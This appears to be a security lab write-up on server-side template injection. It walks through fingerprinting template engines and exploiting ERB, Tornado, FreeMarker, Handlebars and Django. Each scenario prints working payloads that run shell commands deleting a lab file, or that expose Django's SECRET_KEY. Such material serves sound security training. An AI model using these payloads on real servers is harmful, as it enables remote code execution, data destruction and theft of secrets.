# 🧠 Understanding SSTI Exploitation



Server-Side Template Injection (SSTI) occurs when user input is concatenated into a template rather than being passed as data. This allows an attacker to inject template directives which are executed by the server. The impact ranges from information disclosure to full Remote Code Execution (RCE).

This guide breaks down the practical steps to identify the engine and exploit common environments like Ruby (ERB), Python (Tornado/Django), Java (FreeMarker), and Node.js (Handlebars).

---

## 🧪 SCENARIO 1: Identification & Fingerprinting

### 🧐 The Challenge
Before you can exploit SSTI, you must determine *which* engine is running. Different engines use different syntax for expressions.

### 🚨 Exploitation Steps

1.  **Fuzzing (The Polyglot):**
    Inject a sequence of special characters used by various engines to provoke an error or a change in output.
    **Payload:** `${{<%[%'"}}%`
    **Observation:** If the server returns an internal error (500) or renders the input strangely, the syntax is likely being interpreted.

2.  **The Decision Tree:**
    Once execution is suspected, use mathematical operations to fingerprint the specific engine.
    **Payload:** `{{ 7*7 }}`
     **Output `49`:** Could be Jinja2 (Python), Twig (PHP), or others.
     **Output `{{ 7*7 }}`:** Not vulnerable (treated as text).

3.  **Refining the Fingerprint:**
    To distinguish between engines that calculate `7*7` similarly (like Jinja2 vs. Twig), use language-specific behavior.
    **Payload:** `{{ 7*'7' }}`
     **Jinja2 (Python):** Output `7777777` (Python repeats the string).
     **Twig (PHP):** Output `49` (PHP converts the string to a number and multiplies).

**IMPACT:** Successful identification allows for targeted payload crafting.

## 🧪 SCENARIO 2: Basic SSTI via Ruby ERB

### 🧐 How the Vulnerability Exists
The application uses **Ruby's ERB** (Embedded Ruby) templates and concatenates user input directly. This allows injecting template syntax `<%= %>` to execute code.

**Root Cause:** Lack of input sanitization before rendering the template.

### 🚨 Exploitation Steps

1.  **Analyze Behavior:**
    View a product page. Notice the URL parameter `?message=...` is rendered on the screen.

2.  **Test Injection:**
    Inject a Ruby expression to test execution.
    **Payload:** `<%= 7*7 %>`
    **URL Encoded:** `?message=<%25%3d+7*7+%25>`
    **Result:** The page displays `49` instead of the text.

    ![image](/images/Pasted%20image%2020251210110151.png)

3.  **Construct Exploit (RCE):**
    Use Ruby's `system()` method to execute shell commands.
    **Payload:** `<%= system("rm /home/carlos/morale.txt") %>`
    **Result:** The server executes the command, deleting the target file.

    ![image](/images/Pasted%20image%2020251210110213.png)

**IMPACT:** Remote Code Execution on the Ruby server.

## 🧪 SCENARIO 3: SSTI in Python (Tornado) Code Context

### 🧐 How the Vulnerability Exists
The application uses the **Tornado** framework (Python). User input is placed inside a variable context (e.g., `user.<INPUT>`). By closing the context or using Python syntax, we can execute arbitrary code.

**Root Cause:** Insecure handling of user input within the template's variable structure.

### 🚨 Exploitation Steps

1.  **Detection:**
    Capture a request that modifies a template field (e.g., blog post author).
    **Test Payload:** `{{100*100}}`
    **Result:** The name updates to `10000`, confirming injection.

    ![image](/images/Pasted%20image%2020251210115205.png)

2.  **Construct Exploit:**
    Use Python's built-in `__import__` function to import the `os` module and execute commands.
    **Payload:** `{{__import__('os').remove('/home/carlos/morale.txt')}}.first_name`
    *Note:* The `.first_name` appendage satisfies the template engine's syntax expectation.

    ![image](/images/Pasted%20image%2020251210115132.png)

3.  **Execute:**
    Send the request. Refresh the page to trigger the rendering and execute the deletion command.

**IMPACT:** Remote Code Execution on the Python server.

## 🧪 SCENARIO 4: SSTI via Documentation (FreeMarker - Java)

### 🧐 How the Vulnerability Exists
The application uses **FreeMarker** (Java) and exposes the full features of the template engine. Specifically, the `?new()` built-in function allows instantiation of Java classes, bypassing the sandbox.

**Root Cause:** Exposing unsafe built-in functions to user input.

### 🚨 Exploitation Steps

1.  **Identify Engine:**
    Edit a template and inject invalid syntax like `${foobar}`. The error message explicitly mentions `freemarker`.

2.  **Construct Exploit:**
    Use `?new()` to create an instance of `freemarker.template.utility.Execute`, which allows shell command execution.
    **Payload:**
    ```
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
    ```
   .

    ![image](/images/Pasted%20image%2020251210121043.png)

3.  **Execute:**
    Save the template and view the product page. The command executes on the server.

**IMPACT:** Remote Code Execution on the Java server.

## 🧪 SCENARIO 5: SSTI in Node.js (Handlebars)

### 🧐 How the Vulnerability Exists
The application uses **Handlebars** (Node.js). While sandboxed, it is vulnerable to a known exploit where built-in helpers (like `input` or `split`) can be used to access the `Function` constructor, bypassing restrictions.

**Root Cause:** Insufficient sandboxing of the template environment allowing access to the global scope.

### 🚨 Exploitation Steps

1.  **Detection:**
    Inject fuzz strings. The error message references `handlebars` and `Node.js`.

    ![image](/images/Pasted%20image%2020251210124544.png)

2.  **Construct Exploit:**
    Use a complex payload chain that leverages `string.sub` or `string.split` to access the constructor and require `child_process`.
    **Payload Strategy:**
    ```
    wrtz{{#with "s" as |string|}}
      ...
      {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
      ...
    {{/with}}
    ```
   .

    ![image](/images/Pasted%20image%2020251210124057.png)

3.  **Execute:**
    URL encode the payload and inject it into the message parameter. The server executes the command.

**IMPACT:** Remote Code Execution on the Node.js server.

## 🧪 SCENARIO 6: Information Disclosure via Django (Python)

### 🧐 How the Vulnerability Exists
The application uses **Django** (Python). While generally secure against RCE, it passes sensitive internal objects like `settings` into the template context.

**Root Cause:** Inadvertently exposing configuration objects to the template.

### 🚨 Exploitation Steps

1.  **Identify Engine:**
    Inject `{{7*7}}`. Error messages or behavior point to Django.

    ![image](/images/Pasted%20image%2020251210133408.png)

2.  **Enumerate Context:**
    Use the `{% debug %}` tag to dump available variables.
    **Observation:** The `settings` object is listed in the debug output.

    ![image](/images/Pasted%20image%2020251210133346.png)

3.  **Exploit:**
    Access the `SECRET_KEY` from the settings object.
    **Payload:** `{{ settings.SECRET_KEY }}`
    **Result:** The secret key is rendered on the page.

    ![image](/images/Pasted%20image%2020251210134015.png)

**IMPACT:** Critical Information Disclosure (Secret Keys).
